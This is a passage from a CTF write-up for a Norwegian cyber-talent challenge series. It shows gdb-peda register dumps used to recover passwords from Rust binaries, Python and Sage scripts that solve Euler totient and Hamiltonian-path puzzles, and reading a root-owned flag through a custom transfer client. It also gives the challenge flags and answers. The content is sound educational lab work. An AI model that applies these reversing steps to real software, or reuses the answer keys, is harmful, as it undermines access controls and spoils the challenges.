RBX: 0x7fff2eb21db0 --> 0x555556056740 ("PASSWORD\np\037K@\177")
RCX: 0x7fff2eb21ca8 --> 0x0
RDX: 0x9 ('\t')
RSI: 0x555556056740 ("PASSWORD\np\037K@\177")
RDI: 0x0
RBP: 0x0
RSP: 0x7fff2eb21c68 --> 0x7fff2eb21db0 --> 0x555556056740 ("PASSWORD\np\037K@\177")
RIP: 0x7f404b1df54b (<_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+11>:	mov    rcx,rdx)
R8 : 0x555556056730 --> 0x41 ('A')
R9 : 0x18a0
R10: 0x2a ('*')
R11: 0x246
R12: 0x7f404b1f62e0 --> 0x0
R13: 0x1
R14: 0x7fff2eb21de0 --> 0x5
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f404b1df545 <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+5>:	push   rbx
   0x7f404b1df546 <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+6>:	mov    rax,rdi
   0x7f404b1df549 <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+9>:	xor    edi,edi
=> 0x7f404b1df54b <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+11>:	mov    rcx,rdx
   0x7f404b1df54e <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+14>:	sub    rcx,0xf
   0x7f404b1df552 <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+18>:	cmovae rdi,rcx
   0x7f404b1df556 <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+22>:	test   rdx,rdx
   0x7f404b1df559 <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+25>:	
    je     0x7f404b1df759 <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+537>
[------------------------------------stack-------------------------------------]
0000| 0x7fff2eb21c68 --> 0x7fff2eb21db0 --> 0x555556056740 ("PASSWORD\np\037K@\177")
0008| 0x7fff2eb21c70 --> 0x7fff2eb21de0 --> 0x5
0016| 0x7fff2eb21c78 --> 0x0
0024| 0x7fff2eb21c80 --> 0x0
0032| 0x7fff2eb21c88 --> 0x7f404b1ad86b (<_ZN62_$LT$std..io..stdio..StdinLock$u20$as$u20$std..io..BufRead$GT$9read_line17h83b5cac8a98f85baE+91>:	mp    QWORD PTR [rsp+0x30],0x0)
0040| 0x7fff2eb21c90 --> 0x0
0048| 0x7fff2eb21c98 --> 0x7fff2eb21db0 --> 0x555556056740 ("PASSWORD\np\037K@\177")
0056| 0x7fff2eb21ca0 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, core::str::validations::run_utf8_validation () at library/core/src/str/validations.rs:121
121	library/core/src/str/validations.rs: No such file or directory.
```


#### Password and flag
After typing a random password we continue the program (`c` = `continue`), and take a notice of the `RSI` register, containing the password `the_secret_password_is_secret_and_hidden`.
```
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
RAX: 0x7fff2eb21d70 --> 0x7f404b1f3608 --> 0x7f404b1e2090 ("Enter password: called `Result::unwrap()` on an `Err` value")
RBX: 0x555556054160 --> 0x575462630f002254
RCX: 0x6e ('n')
RDX: 0x28 ('(')
RSI: 0x555556056760 ("the_secret_password_is_secret_and_hidden")
RDI: 0x0
RBP: 0x28 ('(')
RSP: 0x7fff2eb21d28 --> 0x555556054160 --> 0x575462630f002254
RIP: 0x7f404b1df54b (<_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+11>:	mov    rcx,rdx)
R8 : 0x555556056750 --> 0x21 ('!')
R9 : 0x1860
R10: 0x2a ('*')
R11: 0x246
R12: 0x555556056760 ("the_secret_password_is_secret_and_hidden")
R13: 0x28 ('(')
R14: 0x555556054120 --> 0x2537071050654a20
R15: 0x5555560541c0 --> 0x23271711746a5631
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f404b1df545 <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+5>:	push   rbx
   0x7f404b1df546 <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+6>:	mov    rax,rdi
   0x7f404b1df549 <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+9>:	xor    edi,edi
=> 0x7f404b1df54b <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+11>:	mov    rcx,rdx
   0x7f404b1df54e <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+14>:	sub    rcx,0xf
   0x7f404b1df552 <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+18>:	cmovae rdi,rcx
   0x7f404b1df556 <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+22>:	test   rdx,rdx
   0x7f404b1df559 <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+25>:	je     0x7f404b1df759 <_ZN4core3str8converts9from_utf817h68bd5c9d8606b0ebE+537>
[------------------------------------stack-------------------------------------]
0000| 0x7fff2eb21d28 --> 0x555556054160 --> 0x575462630f002254
0008| 0x7fff2eb21d30 --> 0x555556054120 --> 0x2537071050654a20
0016| 0x7fff2eb21d38 --> 0x5555560541c0 --> 0x23271711746a5631
0024| 0x7fff2eb21d40 --> 0x28 ('(')
0032| 0x7fff2eb21d48 --> 0x7f404b19d741 (<_ZN6medium4main17h529ab5f9f5af22f3E+1089>:	cmp    DWORD PTR [rsp+0x20],0x1)
0040| 0x7fff2eb21d50 --> 0x7f404b1f2040 --> 0x1
0048| 0x7fff2eb21d58 --> 0x555556056760 ("the_secret_password_is_secret_and_hidden")
0056| 0x7fff2eb21d60 --> 0x28 ('(')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, core::str::validations::run_utf8_validation () at library/core/src/str/validations.rs:121
121	in library/core/src/str/validations.rs
```

```
$ ./rust_medium
Enter password: the_secret_password_is_secret_and_hidden
Flag: etj{rust_sure_creates_long_and_weird_function_names}
```

```
login@corax:~$ scoreboard etj{rust_sure_creates_long_and_weird_function_names}
Kategori: 3.2. Utfordringer middels
Oppgave:  3.2.4_rusty_reversing_medium
Svar:     rust_sure_creates_long_and_weird_function_names

Gratulerer, korrekt svar!
```








## [3.3. Utfordringer vanskelig](./3_utfordringer/3_vanskelig)
### [3.3.1_euler](./3_utfordringer/3_vanskelig/euler)


#### [3.3.1_euler_1](./3_utfordringer/3_vanskelig/euler/1)

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/3_vanskelig/euler/1/screenshots/598ffa7704b3426e82aca79ff2f28875.png" width="300">

Simple challenge where we are supposed to calculate each equation separately and use the results (ASCII charactercodes) to concat them into a string. I used Python, [SageMath](https://www.sagemath.org/), [SymPy](https://www.sympy.org/en/index.html) (for Eulers Polynomial), and some mathematical principles.

##### [`solve_1.py`](./3_utfordringer/3_vanskelig/euler/1/solve_1.py)
```python
from sage.all import *
from sympy import * # for eulers polynomial/number

A = []

# binomial coefficient
A.append(binomial(8, 4) + binomial(5, 1))
# complex numbers
# |a + bi| = sqrt((a + bi)(a - bi)) = sqrt(a^2 + b^2)
A.append(sqrt(45**2 + 108**2))
# trigometric + binomial coeff
A.append(cos(pi/3) * binomial(12, 3))
# complex + euler polynomial/number
A.append(sqrt(105**2 + 36**2) + (4 * euler(0, 75)))
# logarithmic
A.append(2 * ln(e**58))
# phi
# e^{i\pi}: eulers identity/equation => e^{i\pi} + 1 = 0 => e^{i\pi} = -1
A.append(euler_phi(189) + -1)
# euler polynomial/number + trig
A.append(euler(2, 10) - 7 * cos(pi))
# trig
# e^{i\pi}: eulers identity/equation => e^{i\pi} + 1 = 0 => e^{i\pi} = -1
A.append((sin(pi / 6) * euler_phi(484)) + -1)
# euler polynomial/number + trig
# i * sin(pi) = 0, because sin(pi) = 0
A.append(euler(2, 11) + cos(pi) + 0)
# trig + phi + trig
A.append((sin(pi / 6) * euler_phi(303)) + sin(pi / 2))
# trig + phi
A.append(cos(pi / 3) * euler_phi(458))

print("Flag:", "".join([chr(int(a)) for a in A]))
```

```sh
$ python solve_1.py
Flag: Kunstkammer
```

```sh
login@corax:~$ scoreboard kunstkammer
Kategori: 3.3. Utfordringer vanskelig
Oppgave:  3.3.1_euler_1
Svar:     kunstkammer

Gratulerer, korrekt svar!
```


#### [3.3.1_euler_2](./3_utfordringer/3_vanskelig/euler/2)

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/3_vanskelig/euler/2/screenshots/3c76aac2e08946b8addd1aae3152c2a3.png" width="300">

We are given hints regarding [William Rowan](https://en.wikipedia.org/wiki/William_Rowan_Hamilton) and _Cycles_ (Sykler).

---

##### Theory
After doing some quick research (see **Reading materials** below), we find [Hamiltonian paths](https://en.wikipedia.org/wiki/Hamiltonian_path).
> In the mathematical field of graph theory, a Hamiltonian path (or traceable path) is a path in an undirected or directed graph that visits each vertex exactly once. A Hamiltonian cycle (or Hamiltonian circuit) is a Hamiltonian path that is a cycle. Determining whether such paths and cycles exist in graphs is the Hamiltonian path problem, which is **NP-complete.** 

And in addition:
> A Hamiltonian cycle, Hamiltonian circuit, vertex tour or graph cycle is a cycle that **visits each vertex exactly once**. A graph that contains a Hamiltonian cycle is called a Hamiltonian graph. 
---

##### Mapping
Mapping each node to their own ID makes it easier to process later on (I almost missed one node, this it has the ID of `99`).

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/3_vanskelig/euler/2/screenshots/9d48b3f334514b21ba9394580dc1fe84.png" width="300">

With the nodes and their edges mapped, we can now generate our own graphs:

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/3_vanskelig/euler/2/screenshots/654637bc280e4b7f9f377ac931fd3350.png" width="300">

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/3_vanskelig/euler/2/screenshots/8126a9299fe84b98bf8d4c1b477ef414.png" width="300">

---

##### Solution
Knowing that the problem is NP-Complete we can attempt to brute force the solution, and after some searching we find [this method](
https://gist.github.com/mikkelam/ab7966e7ab1c441f947b) and add it to the final code.

##### [solve_2.py](./3_utfordringer/3_vanskelig/euler/2/solve_2.py)

```python
import networkx as nx
import matplotlib.pyplot as plt

DEBUG = True

NODES = {
    1: { "label": "n", "edges": [2, 4] },
    2: { "label": " ", "edges": [1, 3, 8] },
    3: { "label": " ", "edges": [2, 40] },
    4: { "label": "r", "edges": [1, 5, 36, 40] },
    5: { "label": "e", "edges": [4, 6, 38] },
    6: { "label": "v", "edges": [5, 7] },
    7: { "label": " ", "edges": [6, 8, 40] },
    8: { "label": " ", "edges": [2, 7, 9, 38] },
    9: { "label": "r", "edges": [8, 10, 35] },
    10: { "label": "o", "edges": [9, 28, 30, 35] },
    11: { "label": " ", "edges": [12, 30] },
    12: { "label": "m", "edges": [11, 13] },
    13: { "label": "o", "edges": [12, 14, 17] },
    14: { "label": " ", "edges": [13, 15, 16, 17, 99] },
    15: { "label": "r", "edges": [14, 16, 19] },
    16: { "label": "g", "edges": [14, 15, 17, 18, 19, 24] },
    17: { "label": "v", "edges": [13, 14, 16, 20, 25] },
    18: { "label": "n", "edges": [16, 22, 99] },
    99: { "label": " ", "edges": [14, 18, 21] },
    19: { "label": "o", "edges": [15, 16, 36] },
    20: { "label": " ", "edges": [17, 21, 23] },
    21: { "label": " ", "edges": [20, 24, 25, 99] },
    22: { "label": "e", "edges": [18, 23] },
    23: { "label": "t", "edges": [20, 22, 24, 25] },
    24: { "label": "e", "edges": [16, 21, 23] },
    25: { "label": "i", "edges": [17, 21, 23] },
    26: { "label": "e", "edges": [27, 32, 35] },
    27: { "label": "e", "edges": [26, 28, 33, 34] },
    28: { "label": "f", "edges": [10, 27, 29] },
    29: { "label": " ", "edges": [28, 30, 31] },
    30: { "label": " ", "edges": [10, 11, 29, 31, 33, 35] },
    31: { "label": " ", "edges": [29, 30, 32] },
    32: { "label": "n", "edges": [26, 31, 33, 34] },
    33: { "label": "v", "edges": [27, 30, 32] },
    34: { "label": "r", "edges": [27, 32, 35] },
    35: { "label": "d", "edges": [9, 10, 26, 30, 34] },
    36: { "label": "n", "edges": [4, 19, 37] },
    37: { "label": " ", "edges": [36, 38] },
    38: { "label": " ", "edges": [5, 8, 37, 39] },
    39: { "label": "v", "edges": [38, 40] },
    40: { "label": "a", "edges": [3, 4, 7, 39] },
}

EDGES = set()

LABELS = {}

# From https://gist.github.com/mikkelam/ab7966e7ab1c441f947b
def hamilton(G):
    F = [(G,[list(G.nodes())[0]])]
    n = G.number_of_nodes()
    while F:
        graph,path = F.pop()
        confs = []
        neighbors = (node for node in graph.neighbors(path[-1]) 
                     if node != path[-1]) #exclude self loops
        for neighbor in neighbors:
            conf_p = path[:]
            conf_p.append(neighbor)
            conf_g = nx.Graph(graph)
            conf_g.remove_node(path[-1])
            confs.append((conf_g,conf_p))
        for g,p in confs:
            if len(p)==n:
                return p
            else:
                F.append((g,p))
    return None

# Loop through nodes and make sure they have valid edges
for node_id, node in NODES.items():
    edges = ""
    LABELS[node_id] = node["label"]
    for edge_node_id in node["edges"]:
        edge_node = NODES[edge_node_id]

        if node_id not in edge_node["edges"]:
            print(f"Node #{node_id} has Node #{edge_node_id} as an edge node, but Node #{edge_node_id} does not have Node #{node_id}")
            print(f"Node #{node_id}:")
            print(node)
            print(f"Node #{edge_node_id}:")
            print(edge_node)
            exit(1)

        edges += f"\t-> {edge_node_id}\n"

        # Let's add the edge to our global set, if it doesn't exist there yet
        # Very inefficient method to check if the edge exists or not
        for global_edge in EDGES:
            if (global_edge[0] == node_id and global_edge[1] == edge_node_id) \
            or (global_edge[1] == node_id and global_edge[0] == edge_node_id):
                break
        else:
            EDGES.add((node_id, edge_node_id))


    print(f"Node #{node_id} [label='{node['label']}'] has {len(node['edges'])} edges")
    if DEBUG:
        print(edges)

print(f"Found a total of {len(EDGES)} edges")

# Let's re-create the graph
G = nx.DiGraph()

for node in NODES:
    G.add_node(node)

for edge in EDGES:
    G.add_edge(edge[0], edge[1])


print("This might take a while....") # 706893343 iterations...
# path = hamilton(G)
path = [1, 4, 5, 6, 7, 8, 9, 10, 28, 29, 31, 32, 34, 35, 26, 27, 33, 30, 11, 12, 13, 14, 99, 18, 22, 23, 25, 17, 20, 21, 24, 16, 15, 19, 36, 37, 38, 39, 40, 3, 2]

# Reverse the path or we get:
# nrev  rof  nrdeev  mo  netiv  egron  va
path = path[::-1]


# Generate the flag
answer = ""
for node_id in path:
    answer += NODES[node_id]["label"]

print("Answer:", answer)

nx.draw(G, labels=LABELS, with_labels=True)
plt.show()
```

---

##### Flag
```sh
$ python solve_2.py
Answer:   av  norge  viten  om  veedrn  for  vern
```
The sentence does not seem correct, but after a quick Google search we find the Norwegian Armed Force's [yearly focus report **FOKUS 2020**](https://www.forsvaret.no/aktuelt-og-presse/publikasjoner/fokus/Fokus%202020.pdf/_/attachment/inline/639faaf2-7009-4056-9e0d-6dc5a6c5519b:1b228e374a207c8f79b1d8a166d902d7c0edd5e1/Fokus%202020.pdf) with the text `VITEN OM VERDEN FOR VERN AV NORGE` on the frontpage.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/3_vanskelig/euler/2/screenshots/6379b9155b6a49ae835589b2b99ced2d.png" width="300">

```sh
login@corax:~$ scoreboard viten om verden for vern av norge
Kategori: 3.3. Utfordringer vanskelig
Oppgave:  3.3.1_euler_2
Svar:     viten om verden for vern av norge

Gratulerer, korrekt svar!
```

---

##### Reading materials
- [Icosian game](https://en.wikipedia.org/wiki/Icosian_game)
- [Hamiltonian path](https://en.wikipedia.org/wiki/Hamiltonian_path)
- [Hamiltonian Paths and Cycles](https://medium.com/stamatics-iit-kanpur/hamiltonian-paths-and-cycles-4f233bfbc53a)
- [Icosian calculus](https://en.wikipedia.org/wiki/Icosian_calculus)
- [Hamiltonian cycle for a large graph](https://en.wikipedia.org/wiki/Zero-knowledge_proof#Hamiltonian_cycle_for_a_large_graph)




#### [3.3.1_euler_3](./3_utfordringer/3_vanskelig/euler/3/)

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/3_vanskelig/euler/3/screenshots/a154454b37f14c5cb0e31bb606158a52.png" width="300">

##### `h`

We are provided with a binary (`h`), we see that it generates 2 numbers based on the input number.
```shell
$ ./h 1
0, 1
$ ./h 2
1, 2
$ ./h 3
2, 2
```

After attempting to enter invalid characters, we are presented with this output (this can also be found if we open the binary in Ghidra).

```shell
$ ./h -

usage: ./h [options] [one_number]

numbers starting with '0' are treated as octal,
numbers starting with '0x' are treated as hexadecimal
```

Trying the verbose flag (`-v`) we see that the binary uses [Miseve](https://github.com/radii/msieve), "A Library for Factoring Large Integers".
```shell
$ ./h -v 1


Msieve v. 1.54 (SVN unknown)
Sun Dec 20 19:54:17 2020
random seeds: 0031b72a 8498c607
factoring 1 (1 digits)
p1 factor: 1
0,

Msieve v. 1.54 (SVN unknown)
Sun Dec 20 19:54:17 2020
random seeds: 0031b72a 8498c607
factoring 2 (1 digits)
p1 factor: 2
elapsed time 00:00:00
1
```

> What Msieve Does
> ----
> There are plenty of algorithms for performing **integer factorization**.  The Msieve library implements most of them from scratch, and relies on optional external libraries for the rest of them. Trial division and Pollard Rho is used on all inputs; if the result is less than 25 digits in size, tiny custom routines do the factoring. For larger numbers, the code switches to the GMP-ECM library and runs the P-1, P+1 and ECM algorithms, expending a user-configurable amount of effort to do so. If these do not completely factor the input number, the library switches to the heavy artillery. Unless told otherwise, Msieve runs the self initializing quadratic sieve algorithm, and if this doesn't factor the input number then you've found a library problem. If you know what you're doing, Msieve also contains a complete implementation of the number field sieve, that has helped complete some of the largest public factorization efforts known.

Shortly put, it is a library that performs integer factorization with various algorithmns.

#### Pattern
Knowing that there is some form of factorization in play, we continue by looking at the pattern between the numbers. Notice when the input is **5**, how the last number (**2**) of the output (**4, 2**), corresponds with the first number (**2**) of the output (**2, 6**) when the input is **6** (5 + 1).

```shell
$ ./h 5
4, 2
$ ./h 6
2, 6
$ ./h 7
6, 4
$ ./h 8
4, 6
```

In other words, the binary `h` does the following: `h(n) = f(n), f(n + 1)`, where `n` is the input number and `f` is function that calculates the value.

##### Numbers
Now that we have a pattern, what do [the numbers](https://www.youtube.com/watch/vVPT0JT1dOw) themselves mean, what function is being used? We know that the general theme of these challenges is "Euler", and that we have some form of integer factorization. After some quick "Googling" we find [Euler's totient function](https://en.wikipedia.org/wiki/Euler%27s_totient_function) (also called  Euler's phi function).

> In number theory, Euler's totient function **counts the positive integers up to a given integer n that are relatively prime to n**. It is written using the Greek letter phi as φ(n) or ϕ(n), and may also be called Euler's phi function. **In other words, it is the number of integers k in the range 1 ≤ k ≤ n for which the greatest common divisor gcd(n, k) is equal to 1**. The integers k of this form are sometimes referred to as totatives of n.

Using this, we can test the same numbers that we passed into the `h` binary above, and see that they matches.
```shell
# $ ./h 5 
φ(5) = 4
φ(6) = 2
φ(7) = 6
φ(8) = 4
```
---

##### [3.3.1_euler_3a](./3_utfordringer/3_vanskelig/euler/3/#331_euler_3a)

> h(n) = 8, 8

This is easily solveable by pure bruteforcing, `n = 15` because:

```
φ(15) = 8
φ(15 + 1) = φ(16) = 8
h(15) = 8, 8
```

```
login@corax:~$ scoreboard 15
Kategori: 3.3. Utfordringer vanskelig
Oppgave:  3.3.1_euler_3a
Svar:     15

Gratulerer, korrekt svar!
```
---

##### [3.3.1_euler_3b](./3_utfordringer/3_vanskelig/euler/3/#331_euler_3b)

> h(n) = 217772874500023635365563422386019273512381236824318290514357322123165713825792, 636647330747919895136525940302294632068470331232708261863503953920000000000000

Here we use [factordb](http://factordb.com/index.php?query=217772874500023635365563422386019273512381236824318290514357322123165713825792) to provide us with the facotrization of `217772874500023635365563422386019273512381236824318290514357322123165713825792`: `2^100 * 3^99`.

Here we can consider primes and primes to a power, `P = 2^a * 3^b * 5^c...`, in this case we assume `n = 2^a * 3^b`, as every number has to be prime factored this way. 

> If the prime factorisation of n is given by n = p_1^e_1*...*p_n^e_n, then φ(n) = n *(1 - 1/p_1)* ... (1 - 1/p_n).
[Source](https://www.doc.ic.ac.uk/~mrh/330tutor/ch05s02.html)

Writing a quick bruteforce to find `a` and `b` we get the following:

##### [`brute.py`](./3_utfordringer/3_vanskelig/euler/3/brute.py)

```python
from sage.all import *;

number = 217772874500023635365563422386019273512381236824318290514357322123165713825792
for a in range(200):
	for b in range(200):
		n = ZZ(pow(2, a)) * ZZ(pow(3, b))
		result = euler_phi(n)
		if result == number:
			print("Found n: 2^{} * 3^{} = {}".format(a, b, n))
			exit(0)
```
```shell
$ python brute.py
Found n: 2^100 * 3^100 = 653318623500070906096690267158057820537143710472954871543071966369497141477376
```
Which is the same as `(2 * 3)^100`.

```
login@corax:~$ scoreboard 653318623500070906096690267158057820537143710472954871543071966369497141477376
Kategori: 3.3. Utfordringer vanskelig
Oppgave:  3.3.1_euler_3b
Svar:     653318623500070906096690267158057820537143710472954871543071966369497141477376

Gratulerer, korrekt svar!
```
---


##### [3.3.1_euler_3c](./3_utfordringer/3_vanskelig/euler/3/#331_euler_3c)

> h(n) = 9000000000000000000000000000000000000000000000000000000000, 3756326117848493706034345777213934145547380150921415411200

> **Example 3.8.3** If p is a prime, then ϕ(p) = p − 1, because 1, 2, …, p − 1 are all relatively prime to p, and 0 is not.
>
> **Theorem 3.8.4** If p is a prime and a is a positive integer, then
ϕ(p^a) = p^a − p^a−1
[Source](https://www.whitman.edu/mathematics/higher_math_online/section03.08.html)

Using **Example 3.8.3** we test for `p = (a + 1)`, where `a` is our first number (`900000000...`):
```
is_prime(9000000000000000000000000000000000000000000000000000000000 + 1) = true
ϕ(9000000000000000000000000000000000000000000000000000000000 + 1) = 9000000000000000000000000000000000000000000000000000000000
```

```
login@corax:~$ scoreboard 9000000000000000000000000000000000000000000000000000000001
Kategori: 3.3. Utfordringer vanskelig
Oppgave:  3.3.1_euler_3c
Svar:     9000000000000000000000000000000000000000000000000000000001

Gratulerer, korrekt svar!
```
---

##### [3.3.1_euler_3d](./3_utfordringer/3_vanskelig/euler/3/#331_euler_3d)

> d) h(n) = 200000000000001220000000000000120, 99999922911895859181617256996352
> (hint: n = p · q)

Here we are given an additional hint, that `n = p * q`, referring to [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)).

Having a smaller number in this challenge, we can attempt to find [the number of solutions of φ(x) = m](https://faculty.math.illinois.edu/~ford/wwwpapers/sierp.pdf) (or [here](http://www.numbertheory.org/php/carmichael.html).)

Instead making something ourselves, we use [Wolfram Alpha](https://www.wolframalpha.com/input/?i=phi%28n%29%3D200000000000001220000000000000120) to find possible `n`s in `ϕ(n) = 200000000000001220000000000000120`:


###### [`find_3d.py`](./3_utfordringer/3_vanskelig/euler/3/find_3d.py)

```python
ns = [
	200000000000001250000000000000183,
	200057307038170774697836995216983,
	201886792452832730975686574640791,
	400000000000002500000000000000366,
	400114614076341549395673990433966,
	403773584905665461951373149281582
]
# And finish by checking each `n`:
for n in ns:
    a = euler_phi(n)
    b = euler_phi(n + 1)
    if a == 200000000000001220000000000000120 and b == 99999922911895859181617256996352:
        print("Found n:", n)
```

`Found n: 200000000000001250000000000000183`

```
login@corax:~$ scoreboard 200000000000001250000000000000183
Kategori: 3.3. Utfordringer vanskelig
Oppgave:  3.3.1_euler_3d
Svar:     200000000000001250000000000000183

Gratulerer, korrekt svar!
```
---

#### Reading materials
- [Euler's Totient Function and Euler's Theorem](https://www.doc.ic.ac.uk/~mrh/330tutor/ch05s02.html)
- [What is a good way to introduce Euler's totient function?](https://math.stackexchange.com/questions/3470094/what-is-a-good-way-to-introduce-eulers-totient-function) 
- [Solving φ(x)=n, where φ(x) is Euler's totient function - testing Carmichael's conjecture](http://www.numbertheory.org/php/carmichael.html)
- [Estimating the φ(n) of Upper/Lower Bound in its RSA Cryptosystem](https://eprint.iacr.org/2012/666.pdf)
- [The Euler Phi Function](https://www.whitman.edu/mathematics/higher_math_online/section03.08.html)
- [Complexity of Inverting the Euler Function](https://arxiv.org/pdf/math/0404116v3.pdf)
- [The number of solutions of φ(x) = m](https://faculty.math.illinois.edu/~ford/wwwpapers/sierp.pdf)
- [Finding the Inverse of Euler Totient Function](https://library.wolfram.com/infocenter/MathSource/696/)






### [3.3.2_rusty_reversing_hard](./3_utfordringer/3_vanskelig/rust_vanskelig)

We are yet again provided with a binary, but this time without `debug_info`.
```sh
$ file rust_hard
rust_hard: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=54fec6fc3b4190b65ea4c4cb6ae7f91bf7c48cb2, stripped
```

Opening the binary in Ghidra also doesn't help, we continue with `gdb` and use `CTRL + C` when prompted for a password, and the continue with stepping until we find something interesting.

```sh
$ gdb -q rust_hard
gdb-peda$ r
Starting program: ./rust_hard
Enter password: ^C
```

By watching the registers and stack whilst stepping over functions, we see the the `RBX` register changing with various characters, and the we start seeing something appear in the stack: `sometimes_a_password_is_not_very_long_but_this_one_actually_is_supe`. 

```
[----------------------------------registers-----------------------------------]
RAX: 0x555556f7d823 --> 0x0
RBX: 0x72 ('r')
RCX: 0xc ('\x0c')
RDX: 0x555556f7b166 --> 0x7ad74c1d39e314bc
RSI: 0x555556f7b1c6 --> 0x14b820424b8664c9
RDI: 0x0
RBP: 0x555556f7b180 --> 0xe706955ab9544192
RSP: 0x7fffb4a551b0 --> 0x9 ('\t')
RIP: 0x7f97796745f9 (mov    BYTE PTR [rax+rdi*1],bl)
R8 : 0x2
R9 : 0x1701
R10: 0x29 (')')
R11: 0x346
R12: 0x7fffb4a552b8 --> 0x0
R13: 0x0
R14: 0x4f ('O')
R15: 0x555556f7b120 --> 0x826bfc2edc392ee1
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f97796745ec:	nop    DWORD PTR [rax+0x0]
   0x7f97796745f0:	movzx  ebx,BYTE PTR [rdx+rdi*1-0x3]
   0x7f97796745f5:	xor    bl,BYTE PTR [rsi+rdi*1-0x3]
=> 0x7f97796745f9:	mov    BYTE PTR [rax+rdi*1],bl
   0x7f97796745fc:	movzx  ebx,BYTE PTR [rdx+rdi*1-0x2]
   0x7f9779674601:	xor    bl,BYTE PTR [rsi+rdi*1-0x2]
   0x7f9779674605:	mov    BYTE PTR [rax+rdi*1+0x1],bl
   0x7f9779674609:	movzx  ebx,BYTE PTR [rdx+rdi*1-0x1]
[------------------------------------stack-------------------------------------]
0000| 0x7fffb4a551b0 --> 0x9 ('\t')
0008| 0x7fffb4a551b8 --> 0x555556f7d7c0 ("PASSWORD\n\360ly\227\177")
0016| 0x7fffb4a551c0 --> 0x555556f7d7e0 ("sometimes_a_password_is_not_very_long_but_this_one_actually_is_supe")
0024| 0x7fffb4a551c8 --> 0x4f ('O')
0032| 0x7fffb4a551d0 --> 0x0
0040| 0x7fffb4a551d8 --> 0x8
0048| 0x7fffb4a551e0 --> 0x7fffb4a55280 --> 0x555556f7d7c0 ("PASSWORD\n\360ly\227\177")
0056| 0x7fffb4a551e8 --> 0x1
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00007f97796745f9 in ?? ()
```

```sh
[----------------------------------registers-----------------------------------]
RAX: 0x555556f7d823 --> 0x72 ('r')
RBX: 0x72 ('r')
--- snip ---
[------------------------------------stack-------------------------------------]
0008| 0x7fffb4a551b8 --> 0x555556f7d7c0 ("PASSWORD\n\360ly\227\177")
0016| 0x7fffb4a551c0 --> 0x555556f7d7e0 ("sometimes_a_password_is_not_very_long_but_this_one_actually_is_super")
--- snip ---
```

And finially giving us:

```sh
0016| 0x7fffb4a551c0 --> 0x555556f7d7e0 ("sometimes_a_password_is_not_very_long_but_this_one_actually_is_super_duper_long")

```

```sh
login@corax:~/3_utfordringer/3_vanskelig/rust_vanskelig$ ./rust_hard
Enter password: sometimes_a_password_is_not_very_long_but_this_one_actually_is_super_duper_long
Flag: etj{i_did_not_know_rust_did_dynamic_dispatch_with_such_weird_vftable_placement}
```

```sh
login@corax:~/3_utfordringer/3_vanskelig/rust_vanskelig$ scoreboard etj{i_did_not_know_rust_did_dynamic_dispatch_with_such_weird_vftable_placement}
Kategori: 3.3. Utfordringer vanskelig
Oppgave:  3.3.2_rusty_reversing_hard
Svar:     i_did_not_know_rust_did_dynamic_dispatch_with_such_weird_vftable_placement

Gratulerer, korrekt svar!
```




## [3.4. Utfordringer umulig](./3_utfordringer/4_umulig)
### [3.4.8_transfer.root](./3_utfordringer/4_umulig/#348_transfer_root)

Having created a complete CLI for the [transfer client](./3_utfordringer/2_middels/transfer/medium/transfer_client.py) earlier, we can connect to the transfer server and navigate around the file system and find a flag in `/root/FLAG`.

```shell
$ python transfer_client.py transfer 1334
root@transfer:/tmp/transfer$ ls
FLAG_1
FLAG_2
root@transfer:/tmp/transfer$ cd /root
root@transfer:/root$ ls
.bashrc
.profile
FLAG
transfer
root@transfer:/root$ cat FLAG
╭──────╮
│ FLAG ╰───────────────────────────╮
│ 2692ac1fb3e881ab73240db60dd03ae7 │
╰──────────────────────────────────╯
root@transfer:/root$
```

```shell
login@corax:~$ scoreboard 2692ac1fb3e881ab73240db60dd03ae7
Kategori: 3.4. Utfordringer umulig
Oppgave:  3.4.8_transfer.root
